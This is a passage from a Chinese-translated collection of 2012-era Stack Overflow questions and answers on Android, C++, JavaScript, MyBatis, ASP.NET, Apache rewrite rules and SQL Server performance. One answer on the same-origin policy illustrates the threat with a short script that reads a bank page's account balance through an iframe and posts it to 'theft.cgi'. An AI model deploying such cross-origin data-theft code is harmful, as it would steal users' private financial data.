        //name will be sharedUserId of caller, OR if not set the package name of the caller

        String[] packageNames = pm.getPackagesForUid(uid);
        //packageNames is a array of packages using that UID, could be more than 1 if using sharedUserIds

        Log.d("ITestService", String.format("Calling uid: %d (getNameForUid: %s)", uid, name));
        for (String packageName : packageNames) {
            Log.d("ITestService", String.format("getPackagesForUid: %s", packageName));
        } 

        //PID
        int pid = Binder.getCallingPid();
        Log.d("ITestService", String.format("Calling pid: %d", pid));
        String processName = "";

        ActivityManager am = (ActivityManager) getSystemService( ACTIVITY_SERVICE );
        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
        for (ActivityManager.RunningAppProcessInfo proc : processes) {
            if (proc.pid == pid) {
                processName = proc.processName;
                Log.d("ITestService", String.format("Found ProcessName of pid(%d): %s", pid, processName));

                //processName will be the package name of the caller, YEAH!
            }
        }
    }
} 
```

如果您想知道哪个包调用了它，PID 将是最可靠的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:08:17.060

看一眼

[http://developer.android.com/reference/android/app/ActivityManager.RunningAppProcessInfo.html](http://developer.android.com/reference/android/app/ActivityManager.RunningAppProcessInfo.html)

# c++ - 在静态变量初始化中使用 cout 时出现 C++ 分段错误

> ID：12318693
> 
> 赞同：14
> 
> 时间：2012-09-07T13:03:58.443
> 
> 标签：c++, initialization, segmentation-fault, cout

我有一个程序，我使用 cout 来发出调试信息。代码在静态全局变量的初始化中执行，即在程序执行的早期。当我使用自己的构建脚本构建程序时，它在第一次使用 cout 时出现段错误（只有一个字符串文字被转移到 cout，所以它不能是值）。我使用 valgrind 检查早期对无效位置的写入，但没有（也没有可能生成这些写入的代码，我在输出之前没有做太多）。当我将源代码复制到 Eclipse 项目并让 Eclipse 内置构建器构建它时，一切正常。我没有使用任何奇怪的构建器设置，只是用 编译`-ggdb -std=c++0x`，这是仅有的两个标志。

那么，如果之前没有无效写入，带有字符串文字的 cout 会出现段错误的原因是什么？构建配置如何影响这一点？

（对不起，我不能给你一个最小的例子，因为这个例子可以简单地在你的机器上编译，就像我在使用 eclipse builder 时所做的那样）

编辑：这是堆栈跟踪：

```
0x00007ffff7b6d7d1 in std::ostream::sentry::sentry(std::ostream&) () from /usr/lib   /x86_64-linux-gnu/libstdc++.so.6
(gdb) backtrace
#0  0x00007ffff7b6d7d1 in std::ostream::sentry::sentry(std::ostream&) () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#1  0x00007ffff7b6dee9 in std::basic_ostream<char, std::char_traits<char> >& std::__ostream_insert<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*, long) ()
from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#2  0x00007ffff7b6e2ef in std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*) ()
  from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
#3  0x00000000004021be inTest::fill (this=0x6120f8, funcs=...) at inTest.cpp:92 
```

最后一帧是我的代码。第 92 行简单地写道：

```
std::cout << "Test"; 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-07T13:32:35.370

`std::cout`正如 Luchian 所指出的，在构造的第一个实例之前不能使用`ios_base::Init`。但是，您不必定义实例；包括`<iostream>`应该足够了。

初始化顺序在单个翻译单元**中定义。**如果您包含`<iostream>`在所有具有静态实例的文件的顶部，您应该没问题。但是，如果静态对象的构造函数调用另一个翻译单元中的函数，并且输出在该翻译单元中，则仅包含在执行输出的翻译单元中是不够`<iostream>` 的。您必须将其包含在定义静态变量的翻译单元中。即使他们不做任何输出。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-09-07T13:07:46.343

`std::cout`是静态存储中的对象。它保证在进入之前被初始化`main`，但不一定在你的代码中的其他静态之前被初始化。好像静态初始化顺序惨败。

经过一番挖掘：

### 27.4.2.1.6 类 ios_base::Init

> `Init ();`
> 
> 3) 效果：构造一个 Init 类的对象。如果 init_cnt 为零，该函数将值 1 存储在 init_cnt 中，然后构造并初始化对象 cin、cout、cerr、clog (27.3.1)、wcin、wcout、wcerr 和 wclog (27.3.2)。在任何情况下，该函数都会将存储在 init_cnt 中的值加一。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:37:33.650

静态变量初始化是无人区。如果你避免在那里做重要的工作，你就会避免问题。也许您应该将静态变量包装在[单例模式](http://en.wikipedia.org/wiki/Singleton_pattern)中，这样您就可以将初始化推迟到第一次使用它。

# javascript - 清除数据并将旧值附加到文本框中

> ID：12318695
> 
> 赞同：0
> 
> 时间：2012-09-07T13:03:59.200
> 
> 标签：javascript, regex

我正在尝试将值附加到文本框中而不完全清除..我将在小提琴中展示一个关于我在这里尝试实现的示例..

我的代码看起来像

```
$("#newbutton").click(function(){ 
$("#srchBox").val($("#srchBox").val().replace(/\s\S+$/,'').replace(/^\S*$/,'')  + ' ' +"a"+ ":(" +"b" + ") ");
}); 
```

我在小提琴中给出了一些示例输入，对于示例输入#1，它可以正常工作，但在示例输入 2 的情况下它没有， [http://jsfiddle.net/sztnN/](http://jsfiddle.net/sztnN/)

```
//sample input1 : word map game cool
//output : word map game a:(b)

//sample Input2: word map
//output: a(b)
//ExpectedOutput: word a:(b) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:19:18.733

检查这个

```
$("#srchBox").val($("#srchBox").val().replace(/\w+[.!?]?$/, '')  + ' ' +"a"+ ":(" +"b" + ") "); 
```

[http://jsfiddle.net/sztnN/1/](http://jsfiddle.net/sztnN/1/)

# java - mybatis参数的问题

> ID：12318699
> 
> 赞同：0
> 
> 时间：2012-09-07T13:04:18.250
> 
> 标签：java, mysql, mybatis

我正在尝试使用更大的 SQL 语句设置 MyBatis 接口，该语句多次使用相同的参数。我的代码是：

```
@Select({
"select cnfp_nr_years, cnfp_nr_credits, cnfp_credits_activities, cnfp_credits_studies, cnfp_credits_professional_evolution, cnfp_credits_programs_first_second, cnfp_credits_programs_third_fourth ",
"from ",
"(select cnfp_parameter_value as cnfp_nr_years ",
"from cnfp_parameters ", 
"where cnfp_parameter_name='PARAM_NR_YEARS' ",
"and CNFP_PARAMETER_START_DATE <= #{cnfpProcessingDate,jdbcType=DATE} ",
"and (cnfp_parameter_end_date is null or cnfp_parameter_end_date >= #{cnfpProcessingDate,jdbcType=DATE})) as param1, ",
"(select cnfp_parameter_value as cnfp_nr_credits ",
"from cnfp_parameters ",
"where cnfp_parameter_name='PARAM_NR_CREDITS' ",
"and CNFP_PARAMETER_START_DATE <= #{cnfpProcessingDate,jdbcType=DATE} ",
"and (cnfp_parameter_end_date is null or cnfp_parameter_end_date >= #{cnfpProcessingDate,jdbcType=DATE})) as param2, ",
"(select coalesce(sum(cnfp_teacher_activity_cpt_equiv),0) as cnfp_credits_activities ",
"from cnfp_teacher_activities ",
"where cnfp_person_id = #{cnfpPersonId,jdbcType=BIGINT} ",
"and cnfp_teacher_activity_date_equiv <= #{cnfpProcessingDate,jdbcType=DATE}' ",
"and cnfp_teacher_activity_date_expiry >= #{cnfpProcessingDate,jdbcType=DATE}) as activities, ",
"(select coalesce(sum(cnfp_teacher_study_cpt_equiv), 0) as cnfp_credits_studies ",
"from cnfp_teacher_studies ",
"where cnfp_person_id = #{cnfpPersonId,jdbcType=BIGINT} ",
"and cnfp_institution_id is not null ",
"and cnfp_teacher_study_date_equiv <= #{cnfpProcessingDate,jdbcType=DATE} ",
"and cnfp_teacher_study_date_expiry >= #{cnfpProcessingDate,jdbcType=DATE}) as studies, ",
"(select coalesce(sum(cnfp_teacher_study_cpt_equiv), 0) as cnfp_credits_professional_evolution ",
"from cnfp_teacher_studies ",
"where cnfp_person_id = #{cnfpPersonId,jdbcType=BIGINT} ",
"and cnfp_professional_level_id is not null ",
"and cnfp_teacher_study_date_equiv <= #{cnfpProcessingDate,jdbcType=DATE} ",
"and cnfp_teacher_study_date_expiry >= #{cnfpProcessingDate,jdbcType=DATE}) as professional_evolution, ",
"(select coalesce(sum(case when cnfp_program_categories_code in (1,2) then cnfp_program_module_cpt_equiv else 0 end), 0) as cnfp_credits_programs_first_second, ",
"coalesce(sum(case when cnfp_program_categories_code in (3,4) then cnfp_program_module_cpt_equiv else 0 end), 0) as cnfp_credits_programs_third_fourth ",
"from cnfp_teacher_learning_activities ",
"left join cnfp_teacher_learning_activities_x_program_modules on cnfp_teacher_learning_activities.cnfp_teacher_learning_activity_id = cnfp_teacher_learning_activities_x_program_modules.cnfp_teacher_learning_activity_id ",
"left join cnfp_program_modules on cnfp_teacher_learning_activities_x_program_modules.cnfp_program_module_id = cnfp_program_modules.cnfp_program_module_id ",
"left join cnfp_programs on cnfp_program_modules.cnfp_program_id = cnfp_programs.cnfp_program_id ",
"left join cnfp_program_categories on cnfp_programs.cnfp_program_categories_id = cnfp_program_categories.cnfp_program_categories_id ",
"where cnfp_person_id = #{cnfpPersonId,jdbcType=BIGINT} ",
"and CNFP_TEACHER_LEARNING_ACTIVITY_STATUS = 1 ",
"and CNFP_TEACHER_LEARNING_ACTIVITY_GRAD_DATE <= #{cnfpProcessingDate,jdbcType=DATE} ",
"and CNFP_TEACHER_LEARNING_ACTIVITY_EXPIRY_DATE >= #{cnfpProcessingDate,jdbcType=DATE}) as learning_activities"
})
@Results({
    @Result(column="cnfp_nr_years", property="cnfpParamVerifYears", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_nr_credits", property="cnfpParamCreditsAcc", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_credits_activities", property="cnfpCreditsActivities", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_credits_studies", property="cnfpCreditsStudies", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_credits_professional_evolution", property="cnfpCreditsProfessionalEvolution", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_credits_programs_first_second", property="cnfpCreditsProgramsFirstSecondCat", jdbcType=JdbcType.BIGINT),
    @Result(column="cnfp_credits_programs_third_fourth", property="cnfpCreditsThirdFourthCat", jdbcType=JdbcType.BIGINT)
})
CptCalculator selectResults(@Param("cnfpPersonId")Long cnfpPersonId, @Param("cnfpProcessingDate")Date cnfpProcessingDate); 
```

但我不断收到异常：

```
java.sql.SQLException: Parameter index out of range (7 > number of parameters, which is 6).] with root cause 
```

java.sql.SQLException：参数索引超出范围（7 > 参数数量，即 6）。

我不知道为什么。任何帮助，将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:50:06.693

在结果中，您期望 7 个元素，而您只得到 6 个。直接在 DB 客户端中测试您的查询以检查输出。

# javascript - 我的 javascript 太慢了

> ID：12318705
> 
> 赞同：-3
> 
> 时间：2012-09-07T13:04:59.997
> 
> 标签：javascript, jquery, performance, optimization, jquery-plugins

我的 JavaScript 代码使我的网站变得很慢，我不知道我能做什么，也许可以优化它，但我做到了并压缩了 JS 文件。

有人可以帮助我吗？

这是我的代码：

```
$(document).ready(function(){
    // opacity #citation
    var scrollorama = $.scrollorama({ blocks:'.scrollblock' });
    scrollorama.animate('#citation',
    { delay: 5, duration: 250, property:'opacity', start:1 
});

//PARRALAX
$('#nav').localScroll(800);
$('#first_nav').localScroll(800);
RepositionNav();
$(window).resize(function(){
    RepositionNav();
}); 

$('#intro').parallax("50%", 0, 0.1, true);
$('#first').parallax("50%", 0, 0.0, false);
$('#second').parallax("50%", 0, 0.1, true);

$('#third').parallax("50%", 0, 0.3, true);

$('#fourth').parallax("50%", 0, 0.3, true);
    $('.work3').parallax("70%", 6800, 0.1, true);
$('#six').parallax("50%", 0, 0.3, true);
    $('.work4').parallax("20%", 7800, 0.1, true);

// SCROLL EFFECT
$(window).scroll(function () {
    if ($(this).scrollTop() > 0) {
        $('#titre_p h2').stop().animate({ width: "60px", opacity: 0, fontSize: "0em"}, 500 );   
        }
    if ($(this).scrollTop() > 300) {
        $('#titre_p h2').stop().animate({ width: "190px", opacity: 0, fontSize: "0em"}, 500 );   
        }
    if ($(this).scrollTop() > 310) {
        $('#titre_p h2').stop().animate({ width: "190px", opacity: 1, fontSize: "1.9em"}, 100 );
        }
    /*titre_2*/
    if ($(this).scrollTop() > 0) {
        $('#titre_p2 h2').stop().animate({ width: "0px", opacity: 0, fontSize: "0em"}, 500 );   
        }
    if ($(this).scrollTop() > 1360) {
        $('#titre_p h2').stop().animate({ width: "190px", opacity: 0, fontSize: "0em"}, 500 );   
        }
    if ($(this).scrollTop() > 1370) {
        $('#titre_p2 h2').stop().animate({ width: "190px", opacity: 1, fontSize: "1.9em"}, 500 );
        }

    $('.work1').parallax("70%", 3740, 0.2, true);   
    if ($(this).scrollTop() > 1558) {
           $('.work1').parallax("70%", 2820, 0.8, true);   
    }

    $('.work2').parallax("23%", 5950, 2.1, true);        
    if ($(this).scrollTop() > 2528) {
        $('.work2').parallax("23%", 3798, 2.8, true);   
    }

    if ($(this).scrollTop() > 1370) {
        $("#work").removeClass('out').addClass('in'); 
    }   

})
}) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:12:28.177

您正在滚动事件上调用 animate() 方法。此事件在用户拖动滚动条时不断触发。这会导致很多非常昂贵的 animate() 调用。

仅通过查看您的代码很难说出您想要创建的确切效果，所以我不能建议您选择替代方案。您想详细说明您想要实现的目标吗？

# azure-sql-database - Sql Azure 上 CREATE DATABASE AS COPY OF 的排序错误

> ID：12318707
> 
> 赞同：1
> 
> 时间：2012-09-07T13:05:06.667
> 
> 标签：azure-sql-database

**我想使用CREATE DATABASE AS COPY OF**将 SQL Azure 数据库复制到 Azure 上的新数据库，但新数据库的排序规则与源不同。

查看 SQL Azure 的**ALTER DATABASE**的文档，我们无法更改数据库的排序规则。

有没有办法在 Azure 上创建 SQL Azure 数据库的副本并保留排序规则？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T20:04:20.797

我在 Azure 上创建了一个新的 SQL 服务器，并使用相同的技术复制了数据库，排序规则现在是预期的。我原来的服务器出了点问题。

# javascript - 如何检查图像是否加载？

> ID：12318712
> 
> 赞同：0
> 
> 时间：2012-09-07T13:05:42.630
> 
> 标签：javascript, jquery

是否有可能以某种方式检查是否在没有函数 .load() 或 onLoad 的情况下加载了图像？问题是类似 webkit 的浏览器无法正常使用此功能。

**更新：** 问题出在[http://en.wikipedia.org/wiki/Motion_JPEG](http://en.wikipedia.org/wiki/Motion_JPEG) - 加载只会触发一次，否则流正在运行并加载新图像。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:08:12.360

您可以检查`img.width`：如果未加载，则为 0。

但我相信你也可以`onload`在 webkit 浏览器上使用（全部低容量）：

```
 img.onload=function(){
     console.log('loaded!');
 };
 img.src='something'; 
```

当心一个常见的错误：你必须在设置 onload**后**设置 src ，否则如果图像在缓存中，onload 回调将不会被调用。

演示：[在基于 webkit 的 Chrome 上测试](http://jsfiddle.net/ApqC4/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:10:03.303

我在一个项目中使用了这个[https://github.com/desandro/imagesloaded](https://github.com/desandro/imagesloaded)，它对我来说很好用

# c# - ASP.NET 添加一个 httphandler 来编辑下载的文件名

> ID：12318715
> 
> 赞同：6
> 
> 时间：2012-09-07T13:06:03.973
> 
> 标签：c#, asp.net, anchor, httphandler

我的项目中有一个页面`DownloadDocument.aspx`，它的代码隐藏是`DownloadDocument.aspx.cs`

在我的`DownloadDocument.aspx`我有一个锚点，它采用这样的动态链接：

```
<a id="downloadLink" runat="server"  style="margin:5px" 
href="<%# CONTENT_DIRECTORY_ROOT + document.Path %>">Download current file</a> 
```

我想添加一个httphandler来控制下载的文件名，我该怎么做？提前致谢。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-09T16:20:22.213

为此使用通用处理程序（.ashx）怎么样？

您需要添加加载特定信息，例如文件名、内容类型和内容本身。该示例应该为您提供良好的开端。

```
public class GetDownload : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        if (!string.IsNullOrEmpty(context.Request.QueryString["IDDownload"]))
        {
                context.Response.AddHeader("content-disposition", "attachment; filename=mydownload.zip");
                context.Response.ContentType = "application/octet-stream";
                byte[] rawBytes = // Insert loading file with IDDownload to byte array
                context.Response.OutputStream.Write(rawBytes, 0, rawBytes.Length);
        }
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
} 
```

从 URL 调用通用处理程序，如下所示：

```
<a href="/GetDownload.ashx?IDDownload=1337">click here to download</a> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:13:05.040

这取决于您尝试下载的文件类型...因为每个请求都`HTTPHandler`通过`ProcessRequest`. 它会一一检查每个请求。您需要将任何请求添加`HTTPHandler`到您的项目中，并且需要在您的`web.config`.

```
 <httpHandlers>
  <add path="*.jpg,*.jpeg,*.bmp,*.tif,*.tiff" verb="*" type="NameofYourHandler" />
</httpHandlers> 
```

这将检查您对每种类型的请求`Image`..`path`属性中提到

**编辑 ：**

```
<add verb="*" path="*DownloadDocument.aspx " type="NameofYourHandler"/> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:16:57.940

您可以尝试使用此代码

```
<httpHandlers>
  <add 
   verb="POST"  
   path="*.jpg,*.jpeg,*.bmp,*.tif,*.tiff" 
   type="YourHandler" />
</httpHandlers> 
```

# apache - Apache RewriteCondition：检查是否设置了属性

> ID：12318718
> 
> 赞同：0
> 
> 时间：2012-09-07T13:06:19.043
> 
> 标签：apache, mod-rewrite, rewrite, httprequest

出于安全原因，我们有一个 HTTP 请求，如果 HTTP 请求（在我们的例子中称为 HTTP_IndividualAreaCode）设置为某个数字，则授予访问权限。但是，当它为空时，它会被拒绝。但是，如果有人来了，他根本没有设置这个属性，则授予访问权限（当检查一个等于“”的属性时，这不会验证为真）。

如何创建一个 RewriteCond 来检查是否设置了属性（如 PHP 中的 isset）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:31:58.583

您可以使用该`%{ENV:variable}`变量。例如：

```
RewriteCond %{ENV:HTTP_IndividualAreaCode} [0-9]+
RewriteRule ^ /do/something [L] 
```

请注意，mod_rewrite 可以在任何模块设置此环境变量之前或之后执行。因此，这并不总是保证在重写引擎执行此条件时将设置 var。

# java - 位图缩略图的延迟加载列表

> ID：12318722
> 
> 赞同：0
> 
> 时间：2012-09-07T13:06:24.970
> 
> 标签：java, android, multithreading

我很难实现延迟加载列表。我知道，关于类似问题的帖子数不胜数，但请在判断之前先看看我的问题。

**目标**：加载 SD 卡上存在的位图缩略图，但不阻塞主 (UI) 线程，因此列表将平滑滚动。

**资料来源**：我尝试的基础是这两个帖子：

*   [ListView 非常滞后 - Android](https://stackoverflow.com/questions/9069721/listview-is-very-laggy-android) （ViewHolder 想法）
*   [ListView 中图像的延迟加载](https://stackoverflow.com/questions/541966/android-how-do-i-do-a-lazy-load-of-images-in-listview?lq=1) （线程思想）

**到目前为止我的尝试**：

我试图实现一个类来加载和缓存（我不知道，如果它是适当的表达式）缩略图。它看起来像这样（我尽量不贴一堵代码墙，所以我删掉了不重要的部分）：

```
public class ThumbnailContainer
{
    //this will store the thumbnails 
    private final HashMap<File, SoftReference<Bitmap>> data;

    //this Handler class will update the ui, when we got the thumb from a thread
    private static final class BitmapHandler extends Handler
    {
        private final WeakReference<ImageView> image;
        public BitmapHandler(ImageView image) 
            {this.image = new WeakReference<ImageView>(image);}

        @Override
        public void handleMessage(Message msg)
        {
            if(image.get()!=null)
                image.get().setImageBitmap((Bitmap) msg.obj);
        }
    }

    public ThumbnailContainer(Context context)
    {
        data = new HashMap<File, SoftReference<Bitmap>>();
    }

    //this will set the Bitmap to the ImageView (load on a thread if required)
    public void setBitmapOnThread(final File file, final ImageView view)
    {
        //contains will return true, if the data map contains the file key
        //and the SoftReference is still vaild.
        if (contains(file))
        {
            view.setImageBitmap(data.get(file).get());
            return;
        } 
        else
        {
            final Handler handler = new BitmapHandler(view);

            final Thread thread = new Thread()
            {
                @Override
                public void run()
                {
                    Bitmap bitmap = getMeasuredBitmap(file);
                    Message msg = handler.obtainMessage(0, bitmap);
                    handler.sendMessage(msg);
                }
            };

            thread.start();
        }
    }

    // load the Bitmap if it isn't already, scales it down, and recycles the original
    private Bitmap getMeasuredBitmap(File file)
    {
        if (contains(file))
            return data.get(file).get();
        else
        {
            Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath());

            /*counting the scale of the new Bitmap, i cut the detail*/ 

            Bitmap measured = Bitmap.createScaledBitmap(bitmap, w, h, false);
            bitmap.recycle();

            data.put(file, new SoftReference<Bitmap>(measured));

            return measured;
        }
    }

    //returns true, if the map contains this file, and the reference is still valid
    private boolean contains(File file)
    {
        if (data.containsKey(file))
        {
            if (data.get(file).get() != null) return true;
            else return false;
        }
        return false;
    }
} 
```

**结果**：我仍然得到一个非常滞后的列表滚动。就像我什至没有添加线程解决方案一样，只是在 listadapters`getView()`方法中加载了缩略图。我尝试将`Threads`优先级（参见`setBitmapOnThread()`）设置为`LOW`，当我这样做时，滚动通常很流畅，我可以看到缩略图正在加载，但是当我滚动得非常快时，我的内存就会用完。我认为这是因为启动了太多线程，而它们无法完成。

**我的问题**：你们在这里看到明显的错误吗？

如果不是，那么坚持使用低优先级线程解决方案是否明智？如果是这样，那么有没有办法将线程数限制为固定数量（如 5-6），如果达到最大线程数，在开始新的线程之前停止并加入未完成的？我读过关于 ThreadPools 的文章，但我从未使用过。

我真的很感激任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T19:52:13.943

我会停止像你一样使用线程并使用 AsyncTask。使用此任务从磁盘获取文件并将其放置在缓存中（如果不存在）。将缓存的值返回到适配器中的 ImageView。

因此，在您的适配器中将 ImageView 传递给 AsyncTask。让任务完成工作。

# java - 是否可以从嵌套类中引用外部类指针？

> ID：12318724
> 
> 赞同：0
> 
> 时间：2012-09-07T13:06:29.043
> 
> 标签：java, this

我需要`this`在内部类中使用外部类的指针。

`this`如果不保存指针，我不知道该怎么做。有替代方案吗？

```
class outerclass {

  outerClass thisPointer;

  outerclass () {
      //
      // NOTE: I am saving this pointer here to reference
      // by the inner class later.   I am trying to find
      // a different alternative instead of saving this pointer.
      //
      thisPointer = this; 
  }

  class innerClass {

      void doSomething () {

           //
           // is there a way to reference the outter class
           // without having to save the thisPointer from
           // the outter class.
           // NOTE someObject is a class outside of the
           // outterclass control.
           //
           someObject.someMethod (thisPointer);
      }
  }     
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:09:03.693

使用语法`NameOfOuterClass.this`：

```
void doSomething () {
    someObject.someMethod(outerClass.this);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:09:53.053

```
outclass.this 
```

应该做的伎俩。

我假设您的外部类名称是外部类。按照 Java 的约定，你应该以大写字母开头类名

如果我没有正确理解您的示例，那么这里是一些示例代码。这里外部类 (Test1) 中的 a 值被分配给内部类 (Test2) 中的局部变量

```
public class Test1  {

    private int a =42;         

    private class Test2 {

         public void a() {
             int i = Test1.this.a;
         }
} 
```

# javascript - JavaScript双击事件？

> ID：12318726
> 
> 赞同：2
> 
> 时间：2012-09-07T13:06:31.643
> 
> 标签：javascript

**脚本**

```
var timer;
var firing = false;
var begen = function(id) {
    alert('one click');
};

var popupAc = function(id) {
    alert('double click');
};

function cc(id) {
    if (firing) {
        popupAc(id);
        clearTimeout(timer);
        firing = false;
        return;
    }
    firing = true;
    timer = setTimeout(function() {
        begen(id);
        clearTimeout(timer);
        firing = false;
    }, 250);
}​ 
```

**html**

```
<div id="myID" onclick="cc()">Click Here</div>​ 
```

**示例**：http: [//jsfiddle.net/LXSZj/11/](http://jsfiddle.net/LXSZj/11/)

**问题：**

它适用于 ie 和 chrome，但在 Firefox 中，当我双击时，我得到两个警报功能。（警报双击事件和单击事件）

我该如何修复它？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:12:33.260

将您的 clearTimeout 移到警报上方

```
clearTimeout(timer);
popupAc(id); 
```

PS：我可能是错的，只是猜测，这里没有Firefox ..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-24T11:18:26.210

```
<!DOCTYPE html>
<html>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js">
</script>
<script>
  var timer;
  var x = false;

  function myfun(){
    if(timer){
    clearTimeout(timer);
    alert('double click');   
    timer = 0;
     return;
    }
  timer = setTimeout(function(){
                    alert('singleclick');
                    timer=0;
                    clearTimeout(timer);                   

                },250)

            }
        </script>
        </head>
        <body>

         <p>If you singleclick/double-click on me, I will alert.</p>
            <p> i will also alert based on your click</p.

         <script>
       (function(){
     pelem = document.getElementsByTagName('p');

       for(var i=0;i<pelem.length;i++){
      pelem[i].addEventListener('click',myfun,false);
     }

   })()
  </script>

    </body>
      </html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-19T21:41:46.023

为了**控制双击问题**，我构建了这个函数，基本上是针对**你想要防止用户点击太快**、双击等的每个函数。你调用这个函数并定义函数释放的时间范围。这有助于避免 API 或端点调用毫无意义或重复，或在某些情况下滥用。

***method_name**参数只是您想要的任何标签，以防万一您想使用 console.log(runnning_methods); 检查被阻止的数组列表；*

**使用示例：**

```
 var runnning_methods={};
    function preventQuickMethod(method_name,callback,delay_time){
    		if(!delay_time){var delay_time=500;}
    		if(runnning_methods[method_name]==1){return;}
    		setTimeout(function(){ runnning_methods[method_name]=0; console.info(method_name+" released");},delay_time);
    		runnning_methods[method_name]=1;
    		callback();
    }

      function nextpage(){
        preventQuickMethod("dismissSlot",function(){
            document.getElementById("btn").innerHTML="fired at "+Date.now();
        },1000);
    } 
```

```
<button onclick="nextpage()">Fire!</button>
<span id="btn" >EHHEHE</span>
```

# php - 同源政策目的 | 用户数据与基本页面数据 | 客户端页面抓取

> ID：12318735
> 
> 赞同：1
> 
> 时间：2012-09-07T13:06:56.407
> 
> 标签：php, javascript

我想在客户端而不是服务器端抓取页面。然而，同源政策阻止我这样做。

我想了解的是为什么我没有对另一个站点的 DOM 的只读访问权限。

如果我可以通过将页面拉到服务器上并以任何方式访问它来获得相同的信息，这会给站点带来什么安全风险。

我只是想从如下页面中提取基本信息：

```
document.title 
```

如果我可以在服务端做到这一点，为什么不能在客户端呢？主要区别是我不想支付额外的往返费用？

显然用户的数据不应该是可访问的，这是显而易见的，我不需要这方面的信息。但以同样的方式，我可以使用

```
file_get_contents 
```

并解析 DOM，我想做客户端。

不允许 JavaScript 确定……访问用户定义数据与通用页面数据之间的区别的技术限制是什么？

PHP 可以做到。

为什么 JavaScript 不能？

它有什么限制？

我不想绕过它或破解它，但更好地理解目的，也许发现它不适用于我的情况......页面刮擦客户端

**有关的**

[规避同源政策的方法](https://stackoverflow.com/questions/3076414/ways-to-circumvent-the-same-origin-policy)

[同源政策](https://stackoverflow.com/questions/5863744/same-origin-policy)

[服务器如何验证书签（链接中的 javascript）？安全性如何保持？](https://stackoverflow.com/questions/10768768/how-are-bookmarklets-javascript-in-a-link-verfied-by-servers-how-is-security)

[http://en.wikipedia.org/wiki/Representational_state_transfer#Central_principle](http://en.wikipedia.org/wiki/Representational_state_transfer#Central_principle)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:09:59.540

> 为什么我没有对另一个站点的 DOM 的只读访问权限

您的用户可以在任何给定站点上访问的数据可能与您可以在该站点上访问的数据不同。

由于用户可能通过包括 IP 地址在内的各种事物来识别，因此浏览器无法清理所有个人信息的数据。

过于简单的插图：

```
<iframe src="your bank" id="frame"></iframe>
<script>
    var bank = document.getElementById('frame').contentDocument;
    var stolen = bank.getElementById('account_balance').innerText;
    ajax('theft.cgi', stolen); 
```

# php - 如何重构 PHP 以帮助提高 SQL Server 速度？

> ID：12318738
> 
> 赞同：0
> 
> 时间：2012-09-07T13:07:06.197
> 
> 标签：php, sql-server

我的任务是找到解决我们在 PHP Web 应用程序中遇到的一些性能问题的解决方案（基本上，当将大容量用户与峰值流量/负载时间结合起来时，我们正在达到一个“失败”点）。到目前为止，我发现在尝试访问 MS SQL Server 数据库时出现了瓶颈。我们的系统管理员认为这可能是由于 SQL Server 必须进行过多的上下文切换，因为代码查询数据库的数量。

然而，在更多地研究上下文切换以及如何减少它时，我只能模糊地提到如何在应用程序代码级别实际这样做，主要是“重构你的代码，使其不会打这么多电话，”或特定于 .Net 的提示。

我们正在处理一个庞大而复杂的代码库，所以我们不能做像完全重写系统这样的事情，而且我们还可以很好地优化（尽我们所能）个别查询，所以还有什么其他重构机会可以我们希望帮助我们的代码不会让我们的数据库服务器瘫痪吗？

我目前不知道我们数据库服务器上的完整统计信息，但它足以运行 MS SQL Server 2008 并且直到最近都表现良好。

ETA：我只是一个开发人员，没有任何权威，所以我不能做聘请顾问之类的事情。虽然我愿意向我的上级提出建议，但我主要是在寻找我们可以在内部做的事情，以进一步努力解决根本问题。

正如我在评论中解释的那样，我知道上下文切换更多是其他事物的症状，这会导致我们实际看到的问题（数据库响应缓慢；就像在操作系统中一样，进行大量交换导致应用程序响应缓慢，但它本身就是其他事物占用过多 RAM 的症状）。是什么导致上下文切换？很多数据库访问来自应用程序代码。问题是，正如我们的监控软件所显示的那样，我们现在可以得到的单个查询已经很好了，那么我们还能做些什么来解决这个问题呢？

